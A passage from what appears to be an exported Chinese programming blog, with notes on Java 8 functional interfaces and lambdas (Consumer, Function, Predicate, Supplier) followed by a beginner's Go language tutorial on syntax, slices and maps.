有且只有一个抽象方法的接口，如果有重写 Object 中的方法，那也是可以的。 * * &lt;p&gt;Note that instances of functional interfaces can be created with * lambda expressions, method references, or constructor references. * * 函数式接口可以通过 lambda 表达式、方法引用和构造方法引用来创建。 * * &lt;p&gt;If a type is annotated with this annotation type, compilers are * required to generate an error message unless: * * &lt;ul&gt; * &lt;li&gt; The type is an interface type and not an annotation type, enum, or class. * &lt;li&gt; The annotated type satisfies the requirements of a functional interface. * &lt;/ul&gt; * * &lt;p&gt;However, the compiler will treat any interface meeting the * definition of a functional interface as a functional interface * regardless of whether or not a {@code FunctionalInterface} * annotation is present on the interface declaration. * * 编译器会对满足定义函数式接口的接口当做函数式接口，不管它有没有 @FunctionalInterface 注解声明。 * * @jls 4.3.2. The Class Object * @jls 9.8 Functional Interfaces * @jls 9.4.3 Interface Method Body * @since 1.8 */@Documented@Retention(RetentionPolicy.RUNTIME)@Target(ElementType.TYPE)public @interface FunctionalInterface {} 函数式接口可以通过 lambda 表达式、方法引用和构造方法引用来创建。 lambda 表达式：() -&gt; System.out.println(i) 方法引用：System.out::print 构造方法引用：new::ArrayList 用一个例子来说明什么是函数式接口。 @FunctionalInterfaceinterface Cons { void print(); String toString();}/** * @Author: cuzz * @Date: 2019/8/11 16:13 * @Description: */public class Test2 { public void test(Cons func) { func.print(); } public static void main(String[] args) { Test2 test2 = new Test2(); test2.test(() -&gt; System.out.println(&quot;xxx&quot;)); Cons func = () -&gt; System.out.println(&quot;yyy&quot;); test2.test(func); System.out.println(func.getClass()); // 输出 class com.cuzz.Test2$$Lambda$2/2074407503 System.out.println(func.getClass().getSuperclass()); // 输出 class java.lang.Object }} 可以说明3点： 函数式接口只有一个非重写 Object 的抽象方法 lambda 表达式就是一个匿名类 对于一个函数式接口，我们并不关心这个抽象方法的名称。 从Consumer深入理解函数式接口和方法引用我们回到这个例子当中 public class Test1 { public static void main(String[] args) { list.forEach(new Consumer&lt;Integer&gt;() { @Override public void accept(Integer integer) { System.out.println(integer); } }); }} 先看看 Iterable#forEach 这个方法，是 Iterable 这个接口这的默认方法，在 Java 8 中接口中是允许默认方法。对于 Iterable#forEach 是对每个元素执行给定的动作。 public interface Iterable&lt;T&gt; { /** * Returns an iterator over elements of type {@code T}. * * @return an Iterator. */ Iterator&lt;T&gt; iterator(); /** * Performs the given action for each element of the {@code Iterable} * until all elements have been processed or the action throws an * exception. Unless otherwise specified by the implementing class, * actions are performed in the order of iteration (if an iteration order * is specified). Exceptions thrown by the action are relayed to the * caller. * * 对每个元素执行给定的动作。 * * @implSpec * &lt;p&gt;The default implementation behaves as if: * &lt;pre&gt;{@code * for (T t : this) * action.accept(t); * }&lt;/pre&gt; * * @param action The action to be performed for each element * @throws NullPointerException if the specified action is null * @since 1.8 */ default void forEach(Consumer&lt;? super T&gt; action) { Objects.requireNonNull(action); for (T t : this) { action.accept(t); } } default Spliterator&lt;T&gt; spliterator() { return Spliterators.spliteratorUnknownSize(iterator(), 0); }} 看看 Consumer 是什么 package java.util.function;import java.util.Objects;/** * Represents an operation that accepts a single input argument and returns no * result. Unlike most other functional interfaces, {@code Consumer} is expected * to operate via side-effects. * * 表示一个操作接受单一输入参数，无返回结果。 * * &lt;p&gt;This is a &lt;a href=&quot;package-summary.html&quot;&gt;functional interface&lt;/a&gt; * whose functional method is {@link #accept(Object)}. * * @param &lt;T&gt; the type of the input to the operation * * @since 1.8 */@FunctionalInterfacepublic interface Consumer&lt;T&gt; { /** * Performs this operation on the given argument. * * @param t the input argument */ void accept(T t); /** * Returns a composed {@code Consumer} that performs, in sequence, this * operation followed by the {@code after} operation. If performing either * operation throws an exception, it is relayed to the caller of the * composed operation. If performing this operation throws an exception, * the {@code after} operation will not be performed. * * @param after the operation to perform after this operation * @return a composed {@code Consumer} that performs in sequence this * operation followed by the {@code after} operation * @throws NullPointerException if {@code after} is null */ default Consumer&lt;T&gt; andThen(Consumer&lt;? super T&gt; after) { Objects.requireNonNull(after); return (T t) -&gt; { accept(t); after.accept(t); }; }} lambda 表达式的作用： lambda 表达式为 Java 添加了缺失的函数式编程特性，使我们能将函数当做一等公民看待。 在将函数作为一等公民的语言中，lambda 表达式的类型是函数。但在 Java 中，lambda 表达式是对象，它们必须依附于一类特别的对象（函数式接口）； Lambda 表达式的深入对于 lambda 表达式需要根据上下文来推断，我们并不知道 () -&gt; {} 是什么，不知道对应的参数，方法是什么，只用通过前面的 Cons 定义才知道。 @FunctionalInterfaceinterface Cons1 { void print1();}@FunctionalInterfaceinterface Cons2 { void print2();}/** * @Author: cuzz * @Date: 2019/8/11 16:13 * @Description: */public class Test2 { public static void main(String[] args) { Cons1 cons1 = () -&gt; {}; Cons2 cons2 = () -&gt; {}; System.out.println(cons1.getClass().getInterfaces()[0]); // interface com.cuzz.Cons1 System.out.println(cons2.getClass().getInterfaces()[0]); // interface com.cuzz.Cons2 }} 我们先看一个排序的例子： /** * @Author: cuzz * @Date: 2019/8/12 23:09 * @Description: 排序 */public class Test4 { public static void main(String[] args) { List&lt;String&gt; list = Arrays.asList(&quot;cuzz&quot;, &quot;faker&quot;, &quot;mlxg&quot;); Collections.sort(list, (String s1, String s2) -&gt; { return s2.compareTo(s1); }); // 1 Collections.sort(list, (s1, s2) -&gt; s2.compareTo(s1)); // 2 }} 从 1 到 2 简化了很多，修饰符 String 和 return 都可以省略。Java Lambda 表达式是一种匿名函数，它没有声明方法，也没有访问修饰符、返回值和名字。 Lambda 表达式作用： 传递行为，而不仅仅是值 提升抽象层次 API 重用性好 更加灵活 Lambda 基本语法： Java 中的 Lambda 表达式基本语法 如：(argument) -&gt; {body} 省略类型：(arg1, arg2, ...) -&gt; {body} 有类型：(type1 arg1, type2 arg2, ...) -&gt; {body} Lambda 示例说明 (int a, int b) -&gt; {return a + b;} () -&gt; System.out.println(&quot;hello world&quot;) (String s) -&gt; {System.out.println(s);} () -&gt; 42 () -&gt; {return &quot;cuzz&quot;}; Lambda结构 一个 Lambda 表达式可以有零个或多个参数 参数的类型既可以明确声明，也可以根据上下文来推断，如：(int a) 与 (a) 效果相同 所有的参数需包含在圆括号内，参数之间用逗号相隔。如：(a, b) 或 (String a, int b float c) 空圆括号表示参数集为空，如：() -&gt; 42 当只有一个参数，且其类型可推导时，圆括号可以省略，如：a -&gt; return a * a Lambda 表达式的主题可以包含零条或多条语句 如果 Lambda 表达式的主体只有一条语句，花括号可以省略，匿名函数的返回类型与该主体表达式一致 如果 Lambda 表达式的主体包含一条以上语句，表达式必须使用花括号 Function直接先看源码 /** * Represents a function that accepts one argument and produces a result. * * &lt;p&gt;This is a &lt;a href=&quot;package-summary.html&quot;&gt;functional interface&lt;/a&gt; * whose functional method is {@link #apply(Object)}. * * @param &lt;T&gt; the type of the input to the function * @param &lt;R&gt; the type of the result of the function * * @since 1.8 */@FunctionalInterfacepublic interface Function&lt;T, R&gt; { /** * Applies this function to the given argument. * * @param t the function argument * @return the function result */ R apply(T t); default &lt;V&gt; Function&lt;V, R&gt; compose(Function&lt;? super V, ? extends T&gt; before) { Objects.requireNonNull(before); return (V v) -&gt; apply(before.apply(v)); } default &lt;V&gt; Function&lt;T, V&gt; andThen(Function&lt;? super R, ? extends V&gt; after) { Objects.requireNonNull(after); return (T t) -&gt; after.apply(apply(t)); } /** * Returns a function that always returns its input argument. * * @param &lt;T&gt; the type of the input and output objects to the function * @return a function that always returns its input argument */ static &lt;T&gt; Function&lt;T, T&gt; identity() { return t -&gt; t; }} 可以看出 Function 有一个抽象方法和两个默认方法以及一个静态方法。 （1） Function#apply Stream#map 里就是接受一个 Function，对于 Function 意思就是从一个映射到另一个。下面例子就是把字符串映射到大写。对于 String::toUpperCase 使用的是方法引用。 /** * @Author: cuzz * @Date: 2019/8/11 23:13 * @Description: */public class Test3 { public static void main(String[] args) { List&lt;String&gt; list = Arrays.asList(&quot;cuzz&quot;, &quot;faker&quot;, &quot;mlxg&quot;); list.stream().map(item -&gt; item.toUpperCase()).forEach(item -&gt; System.out.println(item)); list.stream().map(String::toUpperCase).forEach(System.out::println); Function&lt;String, String&gt; function = String::toUpperCase; System.out.println(function.getClass()); }} 我们看一个例子： /** * @Author: cuzz * @Date: 2019/8/13 0:08 * @Description: */public class FunctionTest { public static void main(String[] args) { FunctionTest function= new FunctionTest(); int res1 = function.compute(100, target -&gt; target * target); int res2 = function.compute(100, target -&gt; target + 1); System.out.println(res1); // 10000 System.out.println(res2); // 101 int res3 = function.pow(100); int res4 = function.addOne(100); System.out.println(res3); // 10000 System.out.println(res4); // 101 } public int compute(int a, Function&lt;Integer, Integer&gt; function) { return function.apply(a); } public int pow(int a) { return a * a; } public int addOne(int a) { return a + 1; }} 看看 #compute 这个方法，第二个参数传递的是行为，而不是具体的值。 我们本来要定义两个方法，pow 和 addOne 现在把这种行为传递进来。 （2）Function#compose 和 Function#andThen /** * Returns a composed function that first applies the {@code before} * function to its input, and then applies this function to the result. * If evaluation of either function throws an exception, it is relayed to * the caller of the composed function. * * @param &lt;V&gt; the type of input to the {@code before} function, and to the * composed function * @param before the function to apply before this function is applied * @return a composed function that first applies the {@code before} * function and then applies this function * @throws NullPointerException if before is null * * @see #andThen(Function) */default &lt;V&gt; Function&lt;V, R&gt; compose(Function&lt;? super V, ? extends T&gt; before) { Objects.requireNonNull(before); return (V v) -&gt; apply(before.apply(v));}/** * Returns a composed function that first applies this function to * its input, and then applies the {@code after} function to the result. * If evaluation of either function throws an exception, it is relayed to * the caller of the composed function. * * @param &lt;V&gt; the type of output of the {@code after} function, and of the * composed function * @param after the function to apply after this function is applied * @return a composed function that first applies this function and then * applies the {@code after} function * @throws NullPointerException if after is null * * @see #compose(Function) */default &lt;V&gt; Function&lt;T, V&gt; andThen(Function&lt;? super R, ? extends V&gt; after) { Objects.requireNonNull(after); return (T t) -&gt; after.apply(apply(t));} compose方法是一个默认方法，这个方法接收一个 function 作为参数，将参数 function 执行的结果作为参数给调用的 function，以此来实现两个function组合的功能。 andThen 方法也是接收一个 function 作为参数，与 compse 不同的是，先执行本身的 apply 方法，将执行的结果作为参数给参数中的 function。 /** * @Author: cuzz * @Date: 2019/8/20 23:59 * @Description: #compose and #andThen test */public class FunctionTest2 { public static void main(String[] args) { FunctionTest2 test = new FunctionTest2(); System.out.println(test.compute1(2, value -&gt; value * 2, value -&gt; value * value)); // 8 System.out.println(test.compute2(2, value -&gt; value * 2, value -&gt; value * value)); // 16 } public int compute1(int a, Function&lt;Integer, Integer&gt; function1, Function&lt;Integer, Integer&gt; function2) { return function1.compose(function2).apply(a); } public int compute2(int a, Function&lt;Integer, Integer&gt; function1, Function&lt;Integer, Integer&gt; function2) { return function1.andThen(function2).apply(a); }} 发现 compute1 是先执行第二个 Function 再执行第一，compute2 相反。 BiFunction先看源码 /** * Represents a function that accepts two arguments and produces a result. * This is the two-arity specialization of {@link Function}. * * &lt;p&gt;This is a &lt;a href=&quot;package-summary.html&quot;&gt;functional interface&lt;/a&gt; * whose functional method is {@link #apply(Object, Object)}. * * @param &lt;T&gt; the type of the first argument to the function * @param &lt;U&gt; the type of the second argument to the function * @param &lt;R&gt; the type of the result of the function * * @see Function * @since 1.8 */@FunctionalInterfacepublic interface BiFunction&lt;T, U, R&gt; { /** * Applies this function to the given arguments. * * @param t the first function argument * @param u the second function argument * @return the function result */ R apply(T t, U u); /** * Returns a composed function that first applies this function to * its input, and then applies the {@code after} function to the result. * If evaluation of either function throws an exception, it is relayed to * the caller of the composed function. * * @param &lt;V&gt; the type of output of the {@code after} function, and of the * composed function * @param after the function to apply after this function is applied * @return a composed function that first applies this function and then * applies the {@code after} function * @throws NullPointerException if after is null */ default &lt;V&gt; BiFunction&lt;T, U, V&gt; andThen(Function&lt;? super R, ? extends V&gt; after) { Objects.requireNonNull(after); return (T t, U u) -&gt; after.apply(apply(t, u)); }} 我看一个例子 /** * @Author: cuzz * @Date: 2019/8/21 7:36 * @Description: */public class BiFunctionTest { public static void main(String[] args) { BiFunctionTest test = new BiFunctionTest(); // 加法 System.out.println(test.add(1, 2)); System.out.println(test.compute(1, 2, (a, b) -&gt; a + b)); // 减法 System.out.println(test.subtract(1, 2)); System.out.println(test.compute(1, 2, (a, b) -&gt; a - b)); } public int compute(int a, int b, BiFunction&lt;Integer, Integer, Integer&gt; biFunction) { return biFunction.apply(a, b); } public int add(int a, int b) { return a + b; } public int subtract(int a, int b) { return a - b; }} 以前我们定义一个四则运算需要需要先定义方法，现在通过 BiFunction 可以把这种行为传递进来。 Predicate（1）源码 /** * Represents a predicate (boolean-valued function) of one argument. * * &lt;p&gt;This is a &lt;a href=&quot;package-summary.html&quot;&gt;functional interface&lt;/a&gt; * whose functional method is {@link #test(Object)}. * * @param &lt;T&gt; the type of the input to the predicate * * @since 1.8 */@FunctionalInterfacepublic interface Predicate&lt;T&gt; { /** * Evaluates this predicate on the given argument. * * @param t the input argument * @return {@code true} if the input argument matches the predicate, * otherwise {@code false} */ boolean test(T t); /** * Returns a composed predicate that represents a short-circuiting logical * AND of this predicate and another. When evaluating the composed * predicate, if this predicate is {@code false}, then the {@code other} * predicate is not evaluated. * * &lt;p&gt;Any exceptions thrown during evaluation of either predicate are relayed * to the caller; if evaluation of this predicate throws an exception, the * {@code other} predicate will not be evaluated. * * @param other a predicate that will be logically-ANDed with this * predicate * @return a composed predicate that represents the short-circuiting logical * AND of this predicate and the {@code other} predicate * @throws NullPointerException if other is null */ default Predicate&lt;T&gt; and(Predicate&lt;? super T&gt; other) { Objects.requireNonNull(other); return (t) -&gt; test(t) &amp;&amp; other.test(t); } /** * Returns a predicate that represents the logical negation of this * predicate. * * @return a predicate that represents the logical negation of this * predicate */ default Predicate&lt;T&gt; negate() { return (t) -&gt; !test(t); } /** * Returns a composed predicate that represents a short-circuiting logical * OR of this predicate and another. When evaluating the composed * predicate, if this predicate is {@code true}, then the {@code other} * predicate is not evaluated. * * &lt;p&gt;Any exceptions thrown during evaluation of either predicate are relayed * to the caller; if evaluation of this predicate throws an exception, the * {@code other} predicate will not be evaluated. * * @param other a predicate that will be logically-ORed with this * predicate * @return a composed predicate that represents the short-circuiting logical * OR of this predicate and the {@code other} predicate * @throws NullPointerException if other is null */ default Predicate&lt;T&gt; or(Predicate&lt;? super T&gt; other) { Objects.requireNonNull(other); return (t) -&gt; test(t) || other.test(t); } /** * Returns a predicate that tests if two arguments are equal according * to {@link Objects#equals(Object, Object)}. * * @param &lt;T&gt; the type of arguments to the predicate * @param targetRef the object reference with which to compare for equality, * which may be {@code null} * @return a predicate that tests if two arguments are equal according * to {@link Objects#equals(Object, Object)} */ static &lt;T&gt; Predicate&lt;T&gt; isEqual(Object targetRef) { return (null == targetRef) ? Objects::isNull : object -&gt; targetRef.equals(object); }} （2）例子 以前我们根据不同的条件筛选数据需要些多个方法，现在只要先定义一个这种接受行为的方法。 /** * @Author: cuzz * @Date: 2019/8/21 23:35 * @Description: Predicate test */public class PredicateTest { public static void main(String[] args) { List&lt;Integer&gt; list = Arrays.asList(1, 2, 3, 4, 5, 6, 7, 8, 9); PredicateTest test = new PredicateTest(); // 查找奇数 test.findOdd(list); test.conditionFilter(list, i -&gt; i % 2 != 0); // 查找偶数 test.findEven(list); test.conditionFilter(list, i -&gt; i % 2 == 0); } public void conditionFilter(List&lt;Integer&gt; list, Predicate&lt;Integer&gt; predicate) { for (int i : list) { if (predicate.test(i)) { System.out.print(i + &quot; &quot;); } } System.out.println(); } public void findOdd(List&lt;Integer&gt; list) { for (int i : list) { if (i % 2 != 0) { System.out.print(i + &quot; &quot;); } } System.out.println(); } public void findEven(List&lt;Integer&gt; list) { for (int i : list) { if (i % 2 == 0) { System.out.print(i + &quot; &quot;); } } System.out.println(); }} （3）Predicate#and 和 Predicate#or public class PredicateTest { public static void main(String[] args) { List&lt;Integer&gt; list = Arrays.asList(1, 2, 3, 4, 5, 6, 7, 8, 9); PredicateTest test = new PredicateTest(); // 查找 大于 3 的奇数 test.conditionFilter2(list, i -&gt; i &gt; 3, i -&gt; i % 2 != 0); } public void conditionFilter2(List&lt;Integer&gt; list, Predicate&lt;Integer&gt; predicate1, Predicate&lt;Integer&gt; predicate2) { for (int i : list) { if (predicate1.and(predicate2).test(i)) { System.out.print(i + &quot; &quot;); } } System.out.println(); }} Supplier（1）不接受参数，返回一个值。 /** * Represents a supplier of results. * * &lt;p&gt;There is no requirement that a new or distinct result be returned each * time the supplier is invoked. * * &lt;p&gt;This is a &lt;a href=&quot;package-summary.html&quot;&gt;functional interface&lt;/a&gt; * whose functional method is {@link #get()}. * * @param &lt;T&gt; the type of results supplied by this supplier * * @since 1.8 */@FunctionalInterfacepublic interface Supplier&lt;T&gt; { /** * Gets a result. * * @return a result */ T get();} （2）例子 /** * @Author: cuzz * @Date: 2019/8/22 23:32 * @Description: */public class SupplierTest { public static void main(String[] args) { Supplier&lt;Student&gt; supplier1 = () -&gt; new Student(); Supplier&lt;Student&gt; supplier2 = Student::new; }}@Dataclass Student { private String name = &quot;cuzz&quot;; private int age = 20;} Optional参考： 使用 Java 8 Optional 的正确姿势","link":"/2019/08/11/Java8%E7%9A%84%E6%B7%B1%E5%85%A5%E4%B8%8E%E5%AE%9E%E6%88%98/"},{"title":"Go语言入门笔记","text":"Go语言是Google开发的一种静态强类型、编译型、并发型，并具有垃圾回收功能的编程语言，它用批判吸收的眼光，融合C语言、Java等众家之长，将简洁、高效演绎得淋漓尽致。 Go语言起源于2007年，当时Google的技术大神们备受C++越来越臃肿的困扰，决心开发一种新的语言来取代C++。他们认为：与其在臃肿的语言上不断增加新的特性，不如简化编程语言。于是，Golang这门新语言应运而生。 在十年多的时间里，Go语言发展势头强劲，凭借其简洁、高效的特性，在竞争激烈的编程语言市场中占据了一席之地。Google、腾讯、阿里等大公司纷纷选择使用Go语言来开发服务应用项目。当然，和其他的编程语言一样，Go语言也有其自身的缺陷。 课程导论 特点 没有“对象”，没有继承，没有泛型，没有 try/catch 有接口，函数式编程，CSP 并发模型（goroutine + channel） 语法简单 基本语法 变量 选择，循环 指针，数组，容器 面向接口 结构体 duck typing 的概念 组合的思想 函数式编程 闭包的概念 工程化 资源管理，错误处理 测试和文档 性能调优 并发编程 goroutine 和 channel 理解调度器 基本语法HelloWorldpackage mainimport &quot;fmt&quot;func main() { fmt.Println(&quot;Hello World!&quot;)} 变量定义package mainimport &quot;fmt&quot;// 默认变量值func variableZeroValue() { var a int var s string fmt.Println(a, s)}// 定义变量值func variableInitialValue() { var a, b int = 3, 4 var s string = &quot;abc&quot; fmt.Println(a, b, s)}// 变量推断func variableTypeDeduction() { var a, b, c = 1, &quot;abc&quot;, true fmt.Println(a, b, c)}// 变量推断简写func variableShorter() { a, b, c := 1, &quot;abc&quot;, true fmt.Println(a, b, c)}// 全局变量var a = 1// 全局变量定义不能使用 :=// b := 2// 方便定义多个var ( b = &quot;abc&quot; c = 1 d = true)func main() { variableZeroValue() variableInitialValue() variableTypeDeduction() variableShorter()} 内建变量类型 bool, stiring (u)int, (u)int8, (u)int16, (u)int32, (u)int64, uintptr byte, rune float32, float64, complex64, complex128 常量与枚举package mainimport ( &quot;fmt&quot; &quot;math&quot;)func tri() { a, b := 3, 4 var c int // 先把 int 转 float64 再转回 int c = int(math.Sqrt(float64(a*a + b*b))) fmt.Println(c)}// 定义常量func consts() { var c int // 指定类型, 下面需要强转为 float64 // const a, b int = 3, 4 // c = int(math.Sqrt(float64(a*a + b*b))) // 不指定类型, 不需要强转为 float64 const a, b = 3, 4 c = int(math.Sqrt(a*a + b*b)) fmt.Println(c)}// 定义枚举func enums() { //const ( // cpp = 0 // java = 1 // python = 2 // golang = 3 //) // 使用 iota 自增加，与上面一样 const ( cpp = iota java python golang _ // 跳开 4 javascript ) fmt.Println(cpp, java, python, golang, javascript) // 0 1 2 3 5 // b, kb, mb, gb, tb, pb const ( b = 1 &lt;&lt; (10 * iota) kb mb gb tb pb ) fmt.Println(b, kb, mb, gb, tb, pb) // 1 1024 1048576 1073741824 1099511627776 1125899906842624}func main() { tri() consts() enums()} 条件语句package mainimport ( &quot;fmt&quot; &quot;io/ioutil&quot;)// iffunc read() { const filename = &quot;abc.txt&quot; // 读取文件 contents, err := ioutil.ReadFile(filename) if err != nil { fmt.Println(err) } else { fmt.Printf(&quot;%s\\n&quot;, contents) } // 也可以这样写 if contents, err := ioutil.ReadFile(filename); err != nil { fmt.Println(err) } else { fmt.Printf(&quot;%s\\n&quot;, contents) }}// switchfunc eval(a, b int, op string) int { var result int // switch 会自动 break, 除非使用 fallthrough switch op { case &quot;+&quot;: result = a + b case &quot;-&quot;: result = a - b case &quot;*&quot;: result = a * b case &quot;/&quot;: result = a / b default: panic(&quot;unsupported operator: &quot; + op) } return result}// switchfunc grade(score int) string { // switch 后面没有表达式 switch { case score &lt; 0 || score &gt; 100: panic(&quot;wrong score&quot;) case score &lt; 60: return &quot;E&quot; case score &lt; 70: return &quot;D&quot; case score &lt; 80: return &quot;C&quot; case score &lt; 90: return &quot;B&quot; case score &lt;= 100: return &quot;A&quot; } return &quot;&quot;}func main() { read() fmt.Println(eval(1, 2, &quot;+&quot;)) // 3 grade(100)} 循环package mainimport ( &quot;bufio&quot; &quot;fmt&quot; &quot;os&quot; &quot;strconv&quot;)// 转为二进制func convertToBin(n int) string { res := &quot;&quot; for ; n &gt; 0; n /= 2 { lsb := n % 2 res = strconv.Itoa(lsb) + res } return res}// 打印文件func printFile(fileName string) { file, err := os.Open(fileName) if err != nil { panic(err) } scanner := bufio.NewScanner(file) for scanner.Scan() { fmt.Println(scanner.Text()) }}// 死循环func forever() { for { fmt.Println(&quot;forever&quot;) }}func main() { fmt.Println( convertToBin(5), convertToBin(13), ) printFile(&quot;abc.txt&quot;); forever()} 函数package mainimport ( &quot;fmt&quot; &quot;math&quot;)// 返回多个值func div(a, b int) (int, int) { return a / b, a % b}// 可以对返回值命名func div2(a, b int) (q, r int) { return a / b, a % b}// 返回 errorfunc eval(a, b int, op string) (int, error) { switch op { case &quot;+&quot;: return a + b, nil case &quot;-&quot;: return a - b, nil case &quot;*&quot;: return a * b, nil case &quot;/&quot;: return a / b, nil default: return 0, fmt.Errorf(&quot;unsupported opration: %s&quot;, op) }}// 使用函数式编程func apply(op func(int, int) int, a, b int) int { return op(a, b)}// 可变参数func sum(numbers ...int) int { sum := 0 for i := range numbers { sum += numbers[i] } return sum}func pow(a, b int) int { return int(math.Pow(float64(a), float64(b)))}func main() { i, i2 := div(5, 3) fmt.Println(i, i2) q, r := div2(5, 3) fmt.Println(q, r) res, err := eval(1, 2, &quot;&amp;&quot;) // unsupported opration: &amp; if err != nil { fmt.Println(err) } else { fmt.Println(res) } fmt.Println(apply(pow, 2, 2)) // 4 fmt.Println(sum(1, 2, 3, 4)) // 10} 指针package mainimport &quot;fmt&quot;// 使用指针func swap(a *int, b *int) { *b, *a = *a, *b}func swap2(a, b int) (int, int) { return b, a}func main() { a, b := 3, 4 swap(&amp;a, &amp;b) fmt.Println(a, b) // 4 3 a, b = 3, 4 a, b = swap2(a, b) fmt.Println(a, b) // 4 3} 数组、切片和容器数组package mainimport &quot;fmt&quot;// 数组定义func defineArray() { // 定义数组的方法 var arr1 [5]int arr2 := [3]int{1, 3, 5} arr3 := [...]int{2, 4, 6, 8} fmt.Println(arr1, arr2, arr3) // [0 0 0 0 0] [1 3 5] [2 4 6 8] // 定义二维数组 var grid [2][3]int fmt.Println(grid) // [[0 0 0] [0 0 0]]}// 遍历数组func printArray() { arr := [...]int{2, 4, 6, 8} for i := 0; i &lt; len(arr); i++ { fmt.Println(arr[i]) } // 通过 range 可以获取下标 for i := range arr { fmt.Println(arr[i]) } // 获取下标和值 for i, v := range arr { fmt.Println(i, v) } // 只获取值, 可以使用 _ 来省略变量 for _, v := range arr { fmt.Println(v) }}// [3]int 和 [5]int 是不同的类型func printArray2(arr [5]int) { fmt.Println(arr)}// 数组是值类型func printArray3(arr [5]int) { arr[0] = 100 fmt.Println(arr) // [100, 0, 0, 0, 0]}// 传递指针func printArray4(arr *[5]int) { arr[0] = 100 fmt.Println(*arr) // [100, 0, 0, 0, 0]}func main() { defineArray() printArray() var arr1 [5]int // arr2 := [3]int{1, 3, 5} // arr3 := [...]int{2, 4, 6, 8, 10} // [3]int 和 [5]int 是不同的类型 printArray2(arr1) // 在函数里面改变数组的值 // printArray2(arr2) // cannot use arr2 (type [3]int) as type [5]int in argument to printArray2 // 在函数里改变了数组第一个值, 后面打印还是不变，每次传递数组都是一个副本 printArray3(arr1) fmt.Println(arr1) // [0, 0, 0, 0, 0] // 传递地址过去就会改变 printArray4(&amp;arr1) fmt.Println(arr1) // [100, 0, 0, 0, 0]} 切片package mainimport &quot;fmt&quot;// 切片func mySlice() { arr := [...]int{0, 1, 2, 3, 4, 5, 6, 7} fmt.Println(&quot;arr[2:6] = &quot;, arr[2:6]) // arr[2:6] = [2 3 4 5] fmt.Println(&quot;arr[:6] = &quot;, arr[:6]) // arr[2:6] = [2 3 4 5] fmt.Println(&quot;arr[2:] = &quot;, arr[2:]) // arr[2:] = [2 3 4 5 6 7] fmt.Println(&quot;arr[:] = &quot;, arr[:]) // arr[:] = [0 1 2 3 4 5 6 7]}// 更新func updateSlice(slice []int) { slice[0] = 2019}// 扩展func extendSlice() { arr := [...]int{0, 1, 2, 3, 4, 5, 6, 7} // 我们知道 s1 只有 4 个元素, 但是 s2 还是能 s1 := arr[2:6] s2 := s1[3:5] fmt.Println(s1) // [2 3 4 5] fmt.Println(s2) // [5 6] fmt.Printf(&quot;len=%d, cap=%d&quot;, len(s1), cap(s1)) // len=4, cap=6}// 添加func appendSlice() { arr := [...]int{0, 1, 2, 3, 4, 5, 6, 7} // 添加元素如果超过了 cap, 系统会重新分配更大的底层数组 // 由于值的传递关系, 必须接受 append 的返回值 s1 := arr[2:6] s2 := append(s1, 100) s3 := append(s2, 100) s4 := append(s3, 100) s5 := append(s4, 100) fmt.Println(s1, s2, s3, s4, s5) // [2 3 4 5] [2 3 4 5 100] [2 3 4 5 100 100] [2 3 4 5 100 100 100] [2 3 4 5 100 100 100 100]}// 创建 slicefunc createSlice() { // 0. 创建一个空的 slice var s []int // 发现 cap 是从 1 2 4 8 16 32... 扩大 for i := 0; i &lt; 100; i++ { s = append(s, 1+2*i) printSlice(s) } // 1. 创建一个带有值的 slice s1 := []int{1, 2, 3, 4, 5} printSlice(s1) // len=5, cap=5, slice=[1 2 3 4 5] // 2. 创建一个 cap = 16 s2 := make([]int, 16) printSlice(s2) // len=16, cap=16, slice=[0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0] // 3. 创建一个 len = 10, cap = 32 s3 := make([]int, 10, 32) // len=10, cap=32, slice=[0 0 0 0 0 0 0 0 0 0] printSlice(s3)}// 复制func copySlice() { src := []int{1, 2, 3} dst := make([]int, 16) fmt.Println(dst) // [0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0] copy(dst, src) fmt.Println(dst) // [1 2 3 0 0 0 0 0 0 0 0 0 0 0 0 0]}// 删除func deleteSlice() { // 删除下标为3的元素 s := []int{0, 1, 2, 3, 4, 5, 6, 7, 8} s = append(s[:3], s[4:]...) // s[4:]... 转换为可变参数 fmt.Println(s) // [0 1 2 4 5 6 7 8] // 删除第一个 s1 := []int{0, 1, 2, 3, 4, 5, 6, 7, 8} s1 = s1[1:] fmt.Println(s1) // [1 2 3 4 5 6 7 8] // 删除最后一个 s2 := []int{0, 1, 2, 3, 4, 5, 6, 7, 8} s2 = s2[:len(s2) - 1] fmt.Println(s2) // [0 1 2 3 4 5 6 7]}func printSlice(s []int) { fmt.Printf(&quot;len=%d, cap=%d, slice=%v \\n&quot;, len(s), cap(s), s)}func main() { mySlice() arr := [...]int{0, 1, 2, 3, 4, 5, 6, 7} slice1 := arr[:] fmt.Println(&quot;Before update: &quot;, slice1) // Before update: [0 1 2 3 4 5 6 7] updateSlice(slice1) fmt.Println(&quot;After update: &quot;, slice1) // After update: [2019 1 2 3 4 5 6 7] extendSlice() appendSlice() createSlice() copySlice() deleteSlice()} Mappackage mainimport &quot;fmt&quot;// 定义 mapfunc defineMap() { // 定义一个带默认值的 map m1 := map[string]string{ &quot;a&quot;: &quot;A&quot;, &quot;b&quot;: &quot;B&quot;, } // 定义一个 empty map m2 := make(map[string]string) // 定义一个 nil map var m3 map[string]string fmt.Println(m1, m2, m3) // map[a:A b:B] map[] map[]}// 遍历 mapfunc traversingMap() { m := map[string]string{ &quot;a&quot;: &quot;A&quot;, &quot;b&quot;: &quot;B&quot;, } // 打印 key value for k, v := range m { fmt.Println(k, v) } // 只打印 key for k := range m { fmt.Println(k) } // 只打印 value for _, v := range m { fmt.Println(v) }}// 判断是否存在func containMap() { m := map[string]string{ &quot;a&quot;: &quot;A&quot;, &quot;b&quot;: &quot;B&quot;, } value, ok := m[&quot;c&quot;] if ok { fmt.Println(value) } else { fmt.Println(&quot;不存在&quot;) } if value, ok := m[&quot;b&quot;]; ok { fmt.Println(value) } else { fmt.Println(&quot;不存在&quot;) }}// 删除元素func deleteMap() { m := map[string]string{ &quot;a&quot;: &quot;A&quot;, &quot;b&quot;: &quot;B&quot;, } fmt.Println(m) // map[a:A b:B] delete(m, &quot;a&quot;) fmt.Println(m) // map[b:B]}func main() { defineMap() traversingMap() containMap() deleteMap()} 例题：查找最长不重复子串 package mainimport &quot;fmt&quot;// 查早最长不重复子串func lengthOfSubString(s string) int { start := 0 maxLength := 0 lastOccuredMap := make(map[rune]int) for i, ru := range []rune(s) { if lastI, ok := lastOccuredMap[ru]; ok &amp;&amp; lastI &gt;= start { start = lastI + 1 } if i-start+1 &gt; maxLength { maxLength = i - start + 1 } lastOccuredMap[ru] = i } return maxLength}func main() { fmt.Println(lengthOfSubString(&quot;aaa&quot;)) 